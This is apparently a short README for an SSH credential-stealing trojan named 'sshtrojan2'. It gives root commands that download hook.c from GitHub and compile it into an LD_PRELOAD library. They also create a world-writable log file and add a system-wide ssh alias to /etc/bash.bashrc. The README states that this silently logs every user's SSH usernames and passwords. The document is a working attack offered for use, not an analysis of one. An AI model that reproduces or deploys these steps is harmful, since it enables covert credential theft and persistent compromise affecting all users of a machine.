# sshtrojan2
Login as `root`, then run these commands:
```bash
wget https://raw.githubusercontent.com/dungkaito/prog03/main/hook.c
gcc -Wall -fPIC -shared -o hook.so hook.c -ldl
cp hook.so /hook.so
touch /.log_sshtrojan2.txt
chmod 777 /.log_sshtrojan2.txt
echo "alias ssh='LD_PRELOAD=/hook.so ssh'" >> /etc/bash.bashrc
```
Now, if someone login as `any user` and `ssh` to `any host`, all usernames and passwords will be logged by `hook.so` shared library

Log file: `/.log_sshtrojan2.txt`
